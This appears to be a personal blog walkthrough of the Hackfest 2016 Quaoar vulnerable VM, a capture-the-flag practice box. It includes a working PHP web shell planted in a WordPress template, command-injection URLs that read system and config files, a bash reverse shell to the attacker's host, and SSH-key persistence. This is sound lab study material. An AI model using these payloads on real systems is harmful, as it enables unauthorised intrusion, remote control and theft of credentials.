---
layout: blog
title: Hackfest 2016 Quaoar box
date:   2017-03-22 01:42:00 +0100
categories: itsec
comments: true
---

This walkthrough is the first part of the [Hackfest 2016](https://hackfest.ca/en/) CTF challenge, you can find it also in [vulnhub](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/). Honestly, I haven't heard about this conference yet, but it advertises itself as _Hackfest is the largest hacking event in Canada_ so I've decided to give it a try.


## Recon

```
sudo nmap -A -O 192.168.58.101
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m57s, deviation: 0s, median: 59m57s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-03-21T19:20:11-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 192.168.58.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.98 seconds
```

## Going in the front door
I usually like to go for the possibly low hanging fruits, so looking at the scan report, I can see an open Apache webserver. It's time to fire up dirbuster.
It found two interesting things, namely:
* http://192.168.58.101/upload/ - The start pages says, it is Lepton CMS, which I haven't met before, but after a quick google search, one can find 2 vulnerabilities:
	* [PHP Code Injection](https://www.exploit-db.com/exploits/40248/) - this one is during the installation process, which seems locked for a try, I haven't continued exploring it.
	* [Directory Traversal](https://www.exploit-db.com/exploits/40247/) - this one requires possibly user authentication, so it also seems non exploitable
I haven't really felt like playing with some unknown PHP CMS, and wasting my time for things which most probably I wouldn't ever use again, so I tried the other finding, which is Wotrdpress! Every time I see some Wordpress site coming up in a boot2root machine or CTF, I'm already pretty sure, that that's a possible entry point.
* http://192.168.58.101/wordpress/ - let's see what wpscan finds: ```wpscan --url http://192.168.58.101/wordpress/```
	* [!] Upload directory has directory listing enabled: http://192.168.58.101/wordpress/wp-content/uploads/
	* [!] Includes directory has directory listing enabled: http://192.168.58.101/wordpress/wp-includes/ 
	* [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php Reference: https://wpvulndb.com/vulnerabilities/8716
	* [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback Reference: https://wpvulndb.com/vulnerabilities/8718
	* [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection Reference: https://wpvulndb.com/vulnerabilities/8730
These might be useful, but after a quick research, I've decided to try go through the front door first, and enumerated the users with ```wpscan --url http://192.168.58.101/wordpress/ --enumerate u ```

```
[+] Identified the following 2 user/s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
```
I could have used hydra to brute force the password of one of these, but it seems like this vm has a difficulty set to beginner for a reason, I've got in with the default admin:admin credentials. That was too easy:C

## Command execution and the first flag
First I've tried to look around, what we have there, by editing one of the templates with the following code:

```php
<?php
if($_GET['cmd']){
print("<pre>".shell_exec($_GET['cmd'])."</pre>"); die();
}
?>
```
I've tried several links, and looking through the filesystem, I've finally found the first flag!
* http://192.168.58.101/wordpress/?cmd=id
* http://192.168.58.101/wordpress/?cmd=ls
* http://192.168.58.101/wordpress/?cmd=ls /home
* http://192.168.58.101/wordpress/?cmd=cat%20/home/wpadmin/flag.txt

2bafe61f03117ac66a73c3c514de796e

* view-source:http://192.168.58.101/wordpress/?cmd=cat%20../upload/config.php
Also, I found the config file for the wordpress and for the other CMS file, but it was behind the php tags, so I actually had to view the source of the page to get something out of it. From that, I've got the mysql root user and password, which will be useful later. I've tried to check, but mysql wasn't running with root privileges, so I've abandoned this path for a while.

## Getting shell
With another template modification, I was able to get a reverse shell to connect back to my listening netcat: 
```
nc -lvp 4444
```
What I did was to insert
```php
<?php
file_put_contents("conn.sh", "bash -i >& /dev/tcp/192.168.58.102/4444 0>&1");
?>
```
to the template, and it would give me a shell in my running netcat, after visiting http://192.168.58.101/wordpress/?cmd=bash conn.sh.
I've inserted my ssh key to /var/www/.ssh/authorized_keys, and got ssh access to the box.

## Struggling trying to get root
I've spent some time playing with Samba, because it supposed to have a [remote code execution](https://www.owasp.org/index.php/Code_Injection), and I saw that it was running under root. After checking 
```searchsploit samba 3.6.3```
Samba 3.5.11/3.6.3 - Unspecified Remote Code Execution, which is [CE-2012-1182](https://www.cvedetails.com/cve/CVE-2012-1182/)
Unfortunately, neither the python script, which has been provided by searchsploit, not the metasploit module worked, so I had to find another way to get root.

## Getting root finally
I've decided to take a quick break, to get the frustration out, and I've had an idea during that. What if the mysql root password is the same as the UNIX root password? And it worked, so I've got the root flag too:)

```
root@Quaoar:~# cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
```

Time to listen to some nice music:)

<iframe width="560" height="315" src="https://www.youtube.com/embed/2XiYUYcpsT4" frameborder="0" allowfullscreen></iframe>


